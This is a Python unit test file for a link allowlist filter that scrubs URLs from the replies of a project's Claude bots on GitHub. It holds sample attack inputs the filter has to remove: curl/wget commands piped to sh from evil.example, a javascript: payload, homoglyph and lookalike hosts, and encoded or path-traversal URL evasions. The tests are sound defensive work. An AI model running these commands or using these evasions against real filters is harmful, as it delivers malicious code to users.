"""Unit tests of link_filter.py, the allowlist the Claude bots' replies pass.

Run: python3 -m unittest discover -s .github/scripts -p 'test_*.py'
"""

from __future__ import annotations

import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

from link_filter import REMOVED, Policy, StaticChecker, filter_links, host_allowed, path_allowed

SCRIPT = Path(__file__).resolve().parent / "link_filter.py"
GOOD = "0123456789abcdef0123456789abcdef01234567"  # on the default branch
FORK = "fedcba9876543210fedcba9876543210fedcba98"  # only in a fork
CHECKER = StaticChecker(
    default_branches={"Dv2Corn/still-ui": "main", "MHSanaei/3x-ui": "main", "XTLS/Xray-core": "main", "XTLS/REALITY": "main"},
    tags={"Dv2Corn/still-ui": {"v1.5.0", "v1.5.1"}},
    shas={"Dv2Corn/still-ui": {GOOD}},
)
POLICY = Policy(checker=CHECKER)


class HostTest(unittest.TestCase):
    def test_allowed_hosts(self):
        for host in ("github.com", "GitHub.com", "docs.github.com", "raw.githubusercontent.com", "xtls.github.io"):
            self.assertTrue(host_allowed(host), host)

    def test_lookalikes_are_not_allowed(self):
        for host in ("github.com.evil.example", "evilgithub.com", "github.co", "github.com.", ".github.com",
                     "a..github.com", "-x.github.com", "githubusercontent.com", "evil.githubusercontent.com",
                     "gist.github.com", "www.github.com", "a.b.github.com", "objects.githubusercontent.com",
                     "user-images.githubusercontent.com", "avatars.githubusercontent.com",
                     "other.github.io", "xtls.github.io.evil.example", "gіthub.com"):
            self.assertFalse(host_allowed(host), host)


class FilterTest(unittest.TestCase):
    def assertFiltered(self, text, expected, removed, policy=POLICY):
        out, n = filter_links(text, policy)
        self.assertEqual(out, expected)
        self.assertEqual(n, removed, out)

    def assertKept(self, text):
        self.assertFiltered(text, text, 0)

    def test_github_links_stay(self):
        for text in (
            f"https://github.com/Dv2Corn/still-ui/blob/{GOOD}/web/x.go#L10-L12",
            "[x.go:10](https://github.com/Dv2Corn/still-ui/blob/main/web/x.go#L10)",
            "<https://github.com/Dv2Corn/still-ui/issues/3>",
            "see https://docs.github.com/en/actions.",
            "(https://docs.github.com/en/actions/security-guides)",
            "HTTPS://GITHUB.COM/Dv2Corn/still-ui",
            "http://github.com/dv2corn/STILL-UI/pull/3",
            "https://github.com/Dv2Corn/still-ui.git",
            "https://github.com/MHSanaei/3x-ui/issues/7042",
            "https://github.com/mhsanaei/3x-ui/blob/main/x-ui.sh#L5",
            "https://github.com/XTLS",
            "https://github.com/XTLS/Xray-core/pull/5000",
            "https://github.com/XTLS/REALITY/blob/main/tls.go",
            "https://raw.githubusercontent.com/XTLS/Xray-core/main/go.mod",
            "https://raw.githubusercontent.com/MHSanaei/3x-ui/refs/heads/main/install.sh",
            "https://github.com/Dv2Corn/still-ui/blob/main/docs/a%20b.md?plain=1#L2",
            "https://raw.githubusercontent.com/Dv2Corn/still-ui/main/install.sh",
            "https://xtls.github.io/config/inbounds/vless.html",
            "[docs](//github.com/Dv2Corn/still-ui/tree/main/docs)",
            '<a href="https://github.com/Dv2Corn/still-ui">x</a> '
            '<img src="https://raw.githubusercontent.com/Dv2Corn/still-ui/main/a.png" alt="Note: x">',
            '<a title="a > b" href="https://github.com/Dv2Corn/still-ui/issues/1">x</a>',
            "[ref]: https://github.com/Dv2Corn/still-ui/pull/9",
            "https://github.com/Dv2Corn/still-ui/compare/v1.5.0...v1.5.1",
            "https://github.com/Dv2Corn/still-ui/issues?q=is%3Aopen+label%3Abug",
        ):
            self.assertKept(text)

    def test_relative_links_and_plain_text_stay(self):
        for text in (
            "[pr](../pull/3), [other](12), [query](?q=is%3Aopen)",
            "[file](../blob/main/docs/content/docs/en/help/faq.mdx)",
            "[top](#top)",
            "[issue](/Dv2Corn/still-ui/issues/1)",
            "[x](<docs/a b.md>)",
            "//go:embed dist",
            "// comment.example here",
            "x := a // see b.go",
            "config.json, x-ui.db and install.sh",
            "#12 and @maintainer",
            "<!-- claude-issue:run 5 -->\n<!-- claude-issue:analyst -->",
            "Reviewed head: 0123456789abcdef0123456789abcdef01234567",
            "if a < b and c > d",
            "arr[i](x)",
            "github.com/mhsanaei/3x-ui/v3@v3.11.0 and golang.org/x/crypto@v0.40.0",
            "pkg@latest, icon@2x.png, logo@1.5x.webp, `go install x@v1.2.3-beta`",
            "user @ host, @maintainer, a@b",
            "Tel: +1 and hotel:x and Note: y",
            "map[string]: x and [label]: ../pull/2",
            "List<String> and Vec<T> and <b>bold</b>",
        ):
            self.assertKept(text)

    def test_github_outside_the_allowed_repositories_goes(self):
        for url in (
            "https://github.com/attacker/tools/releases/download/v1/fix.sh",
            "https://github.com/attacker",
            "https://github.com/",
            "https://github.com",
            "https://github.com/search?q=a",
            "https://gist.github.com/attacker/0123abcd",
            "https://github.com/user-attachments/assets/0123-4567",
            "https://github.com/user-attachments/files/1/fix.zip",
            "https://raw.githubusercontent.com/attacker/r/main/x.sh",
            "https://objects.githubusercontent.com/github-production-release-asset/1",
            "https://www.github.com/Dv2Corn/still-ui",
            "https://github.com/Dv2Corn/still-ui-evil/x",
            "https://github.com/Dv2Corn/still-uix",
            "https://github.com/Dv2Corn",
            "https://github.com/MHSanaei/other",
            "https://github.com/XTLSx/Xray-core",
            "https://github.com/Dv2Corn/still-ui/../../attacker/x",
            "https://github.com/Dv2Corn/still-ui/./../attacker/x",
            "https://github.com/Dv2Corn/still-ui/%2e%2e/%2E%2E/attacker/x",
            "https://github.com/Dv2Corn%2Fstill-ui/x",
            "https://github.com/attacker%2F..%2FDv2Corn/still-ui",
            "https://github.com//attacker/x",
            "https://github.com/Dv2Corn//still-ui",
            "https://raw.githubusercontent.com/Dv2Corn/still-ui/main/../../../attacker/r/main/x.sh",
        ):
            out, n = filter_links(f"x {url} y", POLICY)
            self.assertEqual((out, n), (f"x {REMOVED} y", 1), url)
        self.assertFiltered("[fix](https://github.com/attacker/r/raw/main/fix.sh)", f"fix {REMOVED}", 1)
        self.assertFiltered('<a href="https://gist.github.com/a/b">x</a>', f"{REMOVED}x</a>", 1)
        self.assertFalse(path_allowed("github.com", "/Dv2Corn/still-ui\\..\\x"))

    def test_any_scheme_and_any_place(self):
        self.assertFiltered("see https://evil.example/x.", f"see {REMOVED}.", 1)
        self.assertFiltered("`curl -fsSL https://evil.example/i.sh | sh`", f"`curl -fsSL {REMOVED} | sh`", 1)
        self.assertFiltered("```\nwget http://evil.example/x\n```", f"```\nwget {REMOVED}\n```", 1)
        for scheme in ("ftp", "git", "ssh", "vless", "x-y.z+1", "FILE"):
            self.assertFiltered(f"a {scheme}://evil.example/x b", f"a {REMOVED} b", 1)
        self.assertFiltered("ftp://github.com/x", REMOVED, 1)
        self.assertFiltered("(https://evil.example/a_(b))", f"({REMOVED})", 1)

    def test_tricks_with_the_host(self):
        for url in (
            "https://github.com@evil.example/",
            "https://user:pass@github.com/",
            "https://github.com.evil.example/",
            "https://github.com:443/x",
            "https://github.com:8443@evil.example/",
            "https://evil.example\\@github.com/",
            "https://github.com\\.evil.example/",
            "https:\\/\\/evil.example/",
            "https:/\\evil.example/",
            "https://github.com%2F@evil.example/",
            "https://gіthub.com/",
            "https://GITHUB.COM.EVIL.EXAMPLE/",
        ):
            out, n = filter_links(f"x {url} y", POLICY)
            self.assertEqual(n, 1, url)
            self.assertNotIn("evil", out.lower(), url)
            self.assertEqual(out, f"x {REMOVED} y", url)

    def test_entities_hiding_a_url(self):
        self.assertFiltered("ht&#116;ps&#58;&#x2F;&#x2f;evil.example/x", REMOVED, 1)
        self.assertFiltered("[t](https&#58;//evil.example)", f"t {REMOVED}", 1)
        self.assertFiltered("[t](https://github.com&#64;evil.example/)", f"t {REMOVED}", 1)
        self.assertFiltered('<a href="https&#x3a;//evil.example">t</a>', f"{REMOVED}t</a>", 1)
        self.assertFiltered("[t](ht&Tab;tps://evil.example)", f"t {REMOVED}", 1)
        # Markup entities stay encoded.
        self.assertKept("&lt;b&gt; &amp; &#42;")

    def test_markdown_inline_links_and_images(self):
        self.assertFiltered("[the fix](https://evil.example/fix.sh)", f"the fix {REMOVED}", 1)
        self.assertFiltered('[t](https://evil.example "title")', f"t {REMOVED}", 1)
        self.assertFiltered("[t](<https://evil.example/a b>)", f"t {REMOVED}", 1)
        self.assertFiltered("[t](https\\://evil.example)", f"t {REMOVED}", 1)
        self.assertFiltered("[t](//evil.example/x)", f"t {REMOVED}", 1)
        self.assertFiltered("[t](/\\evil.example/x)", f"t {REMOVED}", 1)
        self.assertFiltered("[t](javascript:alert(1))", f"t {REMOVED}", 1)
        self.assertFiltered("![shot](https://evil.example/a.png)", f"shot {REMOVED}", 1)
        self.assertFiltered("![](https://evil.example/a.png)", REMOVED, 1)
        self.assertFiltered("[a [b] c](https://evil.example)", f"a [b] c {REMOVED}", 1)
        self.assertFiltered(
            "[![b](https://raw.githubusercontent.com/Dv2Corn/still-ui/main/b.png)](https://evil.example)",
            f"![b](https://raw.githubusercontent.com/Dv2Corn/still-ui/main/b.png) {REMOVED}",
            1,
        )
        self.assertFiltered(
            "[https://evil.example](https://github.com/Dv2Corn/still-ui)", f"[{REMOVED}](https://github.com/Dv2Corn/still-ui)", 1
        )
        out, n = filter_links("[a [b [c]] d](//evil.example)", POLICY)
        self.assertEqual(n, 1)
        self.assertNotIn("evil", out)

    def test_reference_definitions(self):
        self.assertFiltered("[x][1]\n\n[1]: https://evil.example/a", f"[x][1]\n\n[1]: {REMOVED}", 1)
        self.assertFiltered('  [x]: <//evil.example> "t"', f'  [x]: {REMOVED} "t"', 1)
        self.assertFiltered("[x]:\n  https://evil.example", f"[x]: {REMOVED}", 1)
        self.assertKept("[x]: ../pull/2")

    def test_reference_definitions_inside_containers(self):
        self.assertFiltered("> [x]: //evil.example/a", f"> [x]: {REMOVED}", 1)
        self.assertFiltered("> [x]: //3232235777/a", f"> [x]: {REMOVED}", 1)
        self.assertFiltered("- [x]: //evil.example/a", f"- [x]: {REMOVED}", 1)
        self.assertFiltered("1. item\n\n   [x]: <//evil/a>", f"1. item\n\n   [x]: {REMOVED}", 1)
        self.assertFiltered("> [x]:\n> //evil.example/a", f"> [x]: {REMOVED}", 1)
        self.assertFiltered("> > [x]: \\\\evil/a", f"> > [x]: {REMOVED}", 1)
        self.assertFiltered("- [x]: &#47;&#47;evil/a", f"- [x]: {REMOVED}", 1)

    def test_protocol_relative_text_after_entity_decoding(self):
        self.assertFiltered("see &#92;&#92;evil.example/x", f"see {REMOVED}", 1)
        self.assertFiltered("see &#47;&#47;evil.example/x", f"see {REMOVED}", 1)
        self.assertFiltered("see \\\\evil.example\\share", f"see {REMOVED}", 1)
        self.assertFiltered("[t](&#92;&#92;evil/x)", f"t {REMOVED}", 1)

    def test_autolinks_and_www(self):
        self.assertFiltered("<https://evil.example/a>", REMOVED, 1)
        self.assertFiltered("<mailto:a@evil.example>", REMOVED, 1)
        self.assertFiltered("<a@evil.example>", REMOVED, 1)
        self.assertFiltered("<first.last+tag@mail.evil.example>", REMOVED, 1)
        self.assertFiltered("go to www.evil.example/b.", f"go to {REMOVED}.", 1)
        self.assertFiltered("(www.evil.example)", f"({REMOVED})", 1)
        self.assertFiltered("see //evil.example/c now", f"see {REMOVED} now", 1)

    def test_emails_and_schemes_without_slashes(self):
        for text in (
            "mailto:a@evil.example",
            "MAILTO:a@evil.example?subject=x",
            "xmpp:a@evil.example",
            "tel:+15551234567",
            "sms:+15551234567",
            "security@evil.example",
            "first.last+tag@mail.evil.example",
            "noreply@github.com",
        ):
            self.assertFiltered(f"write to {text}.", f"write to {REMOVED}.", 1)
        self.assertFiltered("[mail us](mailto:a@evil.example)", f"mail us {REMOVED}", 1)
        self.assertFiltered('<a href="tel:+1555">x</a>', f"{REMOVED}x</a>", 1)

    def test_html_quoted_values_may_hold_angle_brackets(self):
        self.assertFiltered('<a title=">" href="//3232235777/x">t</a>', f"{REMOVED}t</a>", 1)
        self.assertFiltered("<a title='>' href=//evil>t</a>", f"{REMOVED}t</a>", 1)
        self.assertFiltered('<img alt="a>b" src="//evil/x.png">', REMOVED, 1)
        self.assertFiltered('<a "junk" href=//evil>t</a>', f"{REMOVED}t</a>", 1)
        self.assertFiltered('<a =x href=//evil>t</a>', f"{REMOVED}t</a>", 1)
        self.assertFiltered('<a\ttitle="x"\nhref\n=\n"//evil">t</a>', f"{REMOVED}t</a>", 1)

    def test_html_tag_that_never_closes_loses_its_angle_bracket(self):
        out, n = filter_links('<a href="//3232235777/x" title="never closed\n\nnext paragraph')
        self.assertNotIn("<a", out)
        self.assertGreaterEqual(n, 1)
        out, n = filter_links("<a href=//evil")
        self.assertNotIn("<a", out)
        self.assertGreaterEqual(n, 1)

    def test_html(self):
        self.assertFiltered('<a href="https://evil.example/d">click</a>', f"{REMOVED}click</a>", 1)
        self.assertFiltered("<A HREF=//evil.example>x</A>", f"{REMOVED}x</A>", 1)
        self.assertFiltered('<img src="//evil.example/e.png">', REMOVED, 1)
        self.assertFiltered('<img srcset="a.png 1x, //evil.example/b.png 2x">', REMOVED, 1)
        self.assertFiltered("<a\n  href='https://evil.example'>x</a>", f"{REMOVED}x</a>", 1)
        self.assertFiltered('<picture><source srcset="https://evil.example/a.png"></picture>', f"<picture>{REMOVED}</picture>", 1)
        # A URL in a plain attribute is not a link, but still goes.
        self.assertFiltered('<b title="https://evil.example">x</b>', f'<b title="{REMOVED}">x</b>', 1)

    def test_counts_every_removal_and_is_idempotent(self):
        text = "[a](https://evil.example) https://evil.example <https://evil.example> www.evil.example"
        out, n = filter_links(text, POLICY)
        self.assertEqual(n, 4)
        self.assertEqual(filter_links(out, POLICY), (out, 0))

    def test_relative_links_resolve_against_the_page_they_are_posted_on(self):
        # Posted on https://github.com/Dv2Corn/still-ui/issues/1.
        for target in (
            "/attacker/repo",
            "../../../attacker/repo",
            "../../../../attacker/repo/blob/main/x.sh",
            "/attacker/repo/releases/download/v1/fix.sh",
            "../files/1/fix.zip",
            "../assets/0123/x.png",
            "../wiki/Fix",
            "../blob/0123abc/x.sh",
            f"../blob/{FORK}/x.sh",
            "..\\..\\..\\attacker\\repo",
            "/Dv2Corn",
            "%2e%2e/%2e%2e/%2e%2e/attacker/r",
        ):
            self.assertFiltered(f"[t]({target})", f"t {REMOVED}", 1)
        self.assertFiltered('<a href="/attacker/r">t</a>', f"{REMOVED}t</a>", 1)
        self.assertFiltered('<img src="../../../attacker/r/raw/main/x.png">', REMOVED, 1)
        self.assertFiltered("> [x]: /attacker/r", f"> [x]: {REMOVED}", 1)
        self.assertFiltered("[x](<../../../attacker/r>)", f"x {REMOVED}", 1)

    def test_the_repository_and_page_come_from_the_policy(self):
        other = Policy(repo="Other/Proj", base="https://github.com/Other/Proj/pull/5", checker=CHECKER)
        self.assertFiltered("[t](../issues/2) https://github.com/other/proj/pull/5", "[t](../issues/2) https://github.com/other/proj/pull/5", 0, other)
        self.assertFiltered("https://github.com/Dv2Corn/still-ui/issues/1", REMOVED, 1, other)
        self.assertFiltered("[t](../../../Dv2Corn/still-ui/issues/1)", f"t {REMOVED}", 1, other)

    def test_refs_must_be_the_default_branch_a_tag_or_a_commit_it_contains(self):
        kept = (
            "https://github.com/Dv2Corn/still-ui/blob/main/x.go",
            "https://github.com/Dv2Corn/still-ui/tree/main",
            "https://github.com/Dv2Corn/still-ui/raw/main/install.sh",
            "https://github.com/Dv2Corn/still-ui/blame/main/x.go#L3",
            f"https://github.com/Dv2Corn/still-ui/commit/{GOOD}",
            f"https://github.com/Dv2Corn/still-ui/blob/{GOOD.upper()}/x.go",
            "https://github.com/Dv2Corn/still-ui/tree/v1.5.1/docs",
            "https://github.com/Dv2Corn/still-ui/commits",
            "https://github.com/Dv2Corn/still-ui/commits/main",
            "https://github.com/Dv2Corn/still-ui/compare",
            "https://github.com/Dv2Corn/still-ui/compare/v1.5.0...v1.5.1",
            f"https://github.com/Dv2Corn/still-ui/compare/v1.5.0..{GOOD}",
            "https://github.com/Dv2Corn/still-ui/archive/refs/tags/v1.5.1.tar.gz",
            "https://github.com/Dv2Corn/still-ui/archive/main.zip",
            "https://raw.githubusercontent.com/Dv2Corn/still-ui/v1.5.1/install.sh",
            "https://raw.githubusercontent.com/Dv2Corn/still-ui/refs/tags/v1.5.1/install.sh",
            "https://raw.githubusercontent.com/Dv2Corn/still-ui/refs/heads/main/install.sh",
            f"https://raw.githubusercontent.com/Dv2Corn/still-ui/{GOOD}/install.sh",
            "https://github.com/Dv2Corn/still-ui/releases",
            "https://github.com/Dv2Corn/still-ui/releases/latest",
            "https://github.com/Dv2Corn/still-ui/releases/tag/v1.5.1",
            "https://github.com/Dv2Corn/still-ui/releases/download/v1.5.1/x-ui-linux-amd64.tar.gz",
            "https://github.com/Dv2Corn/still-ui/releases/latest/download/x-ui-linux-amd64.tar.gz",
            "https://github.com/Dv2Corn/still-ui/pull/3/files",
            "https://github.com/Dv2Corn/still-ui/issues/3#issuecomment-1",
            "https://github.com/Dv2Corn/still-ui/discussions/4",
            "https://github.com/MHSanaei/3x-ui/releases/tag/v3.11.0",
        )
        for url in kept:
            self.assertKept(url)
        removed = (
            f"https://github.com/Dv2Corn/still-ui/blob/{FORK}/x.sh",
            f"https://github.com/Dv2Corn/still-ui/commit/{FORK}",
            f"https://github.com/Dv2Corn/still-ui/tree/{FORK}",
            "https://github.com/Dv2Corn/still-ui/blob/0123abc/x.sh",
            "https://github.com/Dv2Corn/still-ui/blob/0123456789abcdef0123456789abcdef0123456/x.sh",
            "https://github.com/Dv2Corn/still-ui/tree/feature-x",
            "https://github.com/Dv2Corn/still-ui/blob/v9.9.9/x",
            "https://github.com/Dv2Corn/still-ui/blob/refs/pull/1/head/x",
            "https://github.com/Dv2Corn/still-ui/blob",
            "https://raw.githubusercontent.com/Dv2Corn/still-ui/" + FORK + "/install.sh",
            "https://raw.githubusercontent.com/Dv2Corn/still-ui/refs/pull/1/head/install.sh",
            "https://raw.githubusercontent.com/Dv2Corn/still-ui/refs/heads/feature/install.sh",
            "https://raw.githubusercontent.com/Dv2Corn/still-ui/main",
            "https://github.com/Dv2Corn/still-ui/compare/main...attacker:still-ui:fix",
            f"https://github.com/Dv2Corn/still-ui/compare/main...{FORK}",
            f"https://github.com/Dv2Corn/still-ui/archive/{FORK}.zip",
            "https://github.com/Dv2Corn/still-ui/archive/main",
            "https://github.com/MHSanaei/3x-ui/releases/download/v3.11.0/x-ui-linux-amd64.tar.gz",
            "https://github.com/Dv2Corn/still-ui/releases/expanded_assets/v1.5.1",
            "https://github.com/Dv2Corn/still-ui/files/123/fix.zip",
            "https://github.com/Dv2Corn/still-ui/assets/1/0123-4567",
            "https://github.com/Dv2Corn/still-ui/wiki/Fix",
            "https://github.com/Dv2Corn/still-ui/find/main",
            f"https://github.com/XTLS/Xray-core/blob/{GOOD}/x.go",
        )
        for url in removed:
            self.assertFiltered(f"x {url} y", f"x {REMOVED} y", 1)

    def test_the_head_under_review_may_be_linked_in_this_repository_only(self):
        review = Policy(base="https://github.com/Dv2Corn/still-ui/pull/9", head_sha=FORK, checker=CHECKER)
        self.assertFiltered(f"https://github.com/Dv2Corn/still-ui/blob/{FORK}/web/x.go#L10", REMOVED, 1)
        self.assertFiltered(f"https://github.com/Dv2Corn/still-ui/blob/{FORK}/x", f"https://github.com/Dv2Corn/still-ui/blob/{FORK}/x", 0, review)
        self.assertFiltered(f"https://github.com/MHSanaei/3x-ui/blob/{FORK}/x", REMOVED, 1, review)

    def test_refs_fail_closed_without_answers(self):
        bare = Policy()
        self.assertFiltered("https://github.com/Dv2Corn/still-ui/blob/main/x.go", REMOVED, 1, bare)
        self.assertFiltered(f"https://github.com/Dv2Corn/still-ui/commit/{GOOD}", REMOVED, 1, bare)
        self.assertFiltered("https://github.com/Dv2Corn/still-ui/issues/3", "https://github.com/Dv2Corn/still-ui/issues/3", 0, bare)

    def test_a_url_is_checked_as_far_as_github_links_it(self):
        for text in (
            'https://github.com/Dv2Corn/still-ui"/../../attacker/repo',
            "https://github.com/Dv2Corn/still-ui]/../../attacker/repo",
            "https://github.com/Dv2Corn/still-ui'/../../../attacker",
            "https://github.com/Dv2Corn/still-ui`/../../attacker/repo",
            "https://github.com/Dv2Corn/still-ui>/../../attacker/repo",
            "https://github.com/Dv2Corn/still-ui)/../../attacker/repo",
            "www.github.com/Dv2Corn/still-ui]/../../x",
        ):
            out, n = filter_links(text, POLICY)
            self.assertEqual(n, 1, text)
            self.assertNotIn("attacker", out, text)
        for text in (
            "`https://github.com/Dv2Corn/still-ui`",
            '"https://github.com/Dv2Corn/still-ui/issues/3"',
            "'https://github.com/Dv2Corn/still-ui/issues/3',",
            "(https://github.com/Dv2Corn/still-ui/issues/3).",
            "https://github.com/Dv2Corn/still-ui/issues/3&amp;",
            "see https://github.com/Dv2Corn/still-ui/issues/3!",
            "[https://github.com/Dv2Corn/still-ui](https://github.com/Dv2Corn/still-ui)",
            "https://github.com/Dv2Corn/still-ui[x](#a)",
            "bash <(curl -Ls https://raw.githubusercontent.com/Dv2Corn/still-ui/main/install.sh)",
        ):
            self.assertKept(text)


FAKE_GH = r"""#!/bin/sh
# Answers `gh api PATH --jq EXPR` from $FAKE_API/<PATH with / as _>; a missing
# file is a 404.
echo "$*" >> "$FAKE_API/calls.log"
f="$FAKE_API/$(printf '%s' "$2" | tr '/' '_')"
[ "$1" = api ] && [ -f "$f" ] || { echo "gh: Not Found (HTTP 404)" >&2; exit 1; }
cat "$f"
"""


class CliTest(unittest.TestCase):
    def run_cli(self, text, *args, api=None):
        with tempfile.TemporaryDirectory() as d:
            src, dst = Path(d) / "in.md", Path(d) / "out.md"
            src.write_bytes(text.encode())
            (Path(d) / "api").mkdir()
            for path, answer in (api or {}).items():
                (Path(d) / "api" / path.replace("/", "_")).write_text(answer + "\n")
            gh = Path(d) / "gh"
            gh.write_text(FAKE_GH)
            gh.chmod(0o755)
            env = dict(os.environ, PATH=f"{d}:{os.environ['PATH']}", FAKE_API=str(Path(d) / "api"))
            proc = subprocess.run(
                [sys.executable, "-I", str(SCRIPT), *args, str(src), str(dst)], capture_output=True, text=True, env=env
            )
            calls = (Path(d) / "api" / "calls.log").read_text() if (Path(d) / "api" / "calls.log").exists() else ""
            self.calls = calls.splitlines()
            return proc, dst.read_bytes().decode()

    def test_refs_are_checked_with_the_api_and_fail_closed(self):
        text = (
            "https://github.com/o/r/blob/main/a.go "
            f"https://github.com/o/r/blob/{GOOD}/b.go "
            f"https://github.com/o/r/blob/{FORK}/c.go "
            "https://github.com/o/r/tree/v1 "
            "https://github.com/o/r/tree/v2 "
            "https://github.com/XTLS/Xray-core/blob/main/d.go\n"
        )
        api = {
            "repos/o/r": "main",
            f"repos/o/r/compare/main...{GOOD}": "behind",
            f"repos/o/r/compare/main...{FORK}": "diverged",
            "repos/o/r/git/ref/tags/v1": "refs/tags/v1",
        }
        proc, out = self.run_cli(text, "--repo", "o/r", "--base", "https://github.com/o/r/issues/7", api=api)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertEqual(
            out,
            f"https://github.com/o/r/blob/main/a.go https://github.com/o/r/blob/{GOOD}/b.go {REMOVED} "
            f"https://github.com/o/r/tree/v1 {REMOVED} {REMOVED}\n",
        )
        self.assertIn("Removed 3 link(s)", proc.stdout)
        # One lookup of the default branch, whatever the number of links.
        self.assertEqual(sum(c == "api repos/o/r --jq .default_branch" for c in self.calls), 1)

    def test_the_reviewed_head_needs_no_api(self):
        proc, out = self.run_cli(
            f"https://github.com/o/r/blob/{FORK}/x.go", "--repo", "o/r", "--base", "https://github.com/o/r/pull/9",
            "--head-sha", FORK,
        )
        self.assertEqual((proc.returncode, out, self.calls), (0, f"https://github.com/o/r/blob/{FORK}/x.go", []))

    def test_warns_with_the_count_and_never_the_url(self):
        proc, out = self.run_cli("a https://evil.example/x b [c](https://evil.example/y)\n")
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertEqual(out, f"a {REMOVED} b c {REMOVED}\n")
        self.assertEqual(proc.stdout.count("::warning::"), 1)
        self.assertIn("Removed 2 link(s)", proc.stdout)
        self.assertNotIn("evil", proc.stdout + proc.stderr)

    def test_silent_when_nothing_is_removed(self):
        proc, out = self.run_cli("fine https://github.com/Dv2Corn/still-ui\r\n")
        self.assertEqual((proc.returncode, proc.stdout, out), (0, "", "fine https://github.com/Dv2Corn/still-ui\r\n"))


if __name__ == "__main__":
    unittest.main()
